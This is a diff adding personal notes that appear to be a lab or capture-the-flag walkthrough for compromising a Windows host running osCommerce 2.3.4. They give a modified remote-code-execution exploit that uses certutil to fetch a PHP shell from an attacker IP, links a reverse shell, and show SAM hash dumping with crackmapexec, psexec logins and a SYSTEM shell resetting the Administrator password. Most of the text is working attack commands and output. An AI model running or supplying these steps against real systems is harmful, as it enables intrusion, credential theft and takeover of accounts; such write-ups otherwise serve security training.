@@ -1,0 +1,71 @@
+STEPS:
+1. You can use the https://www.exploit-db.com/exploits/44374, but you need to modify it little bit. Since, system command is restricted you can use exec or shell_exec command with echo before that. To upload the shell use echo shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.13.19.104/shell.php shell.php") command in the exploit 44374
+2. After that you can use the certutil command to upload a php reverse php shell. Php reverse shell for windows:
+
+4. Windows PHP Reverse shell binary implementation:
+
+https://github.com/Dhayalanb/windows-php-reverse-shell
+
+4. crackmapexec smb '10.10.153.99' -u 'Administrator' -p 'Password123' --local-auth --sam
+To get the NTLM hash. 
+
+5. psexec can  be used to get the shell as well:
+python3 psexec.py ./administrator:'Password123'@'10.10.167.90'
+
+
+
+parent link: https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution
+The exploit works without any change and let you have the Reverse shell. 
+
+
+OSCommerce:https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution
+
+└─# python3 oscommerce-234.py http://10.10.167.90:8080/oscommerce-2.3.4/catalog/ 
+[*] Install directory still available, the host likely vulnerable to the exploit.
+[*] Testing injecting system command to test vulnerability
+User: nt authority\system
+
+RCE_SHELL$ dir
+ Volume in drive C has no label.
+ Volume Serial Number is 14AF-C52C
+
+ Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
+
+07/30/2024  01:44 PM    <DIR>          .
+07/30/2024  01:44 PM    <DIR>          ..
+04/11/2019  10:52 PM               447 application.php
+07/30/2024  01:44 PM             1,118 configure.php
+04/11/2019  10:52 PM    <DIR>          functions
+               2 File(s)          1,565 bytes
+               3 Dir(s)  19,505,147,904 bytes free
+
+RCE_SHELL$ whoami
+nt authority\system
+
+RCE_SHELL$ dir
+ Volume in drive C has no label.
+ Volume Serial Number is 14AF-C52C
+
+ Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
+
+07/30/2024  01:44 PM    <DIR>          .
+07/30/2024  01:44 PM    <DIR>          ..
+04/11/2019  10:52 PM               447 application.php
+07/30/2024  01:45 PM             1,118 configure.php
+04/11/2019  10:52 PM    <DIR>          functions
+               2 File(s)          1,565 bytes
+               3 Dir(s)  19,505,147,904 bytes free
+
+RCE_SHELL$ net user administrator Password123
+The command completed successfully.
+
+
+
+
+
+
+
+
+
+
+
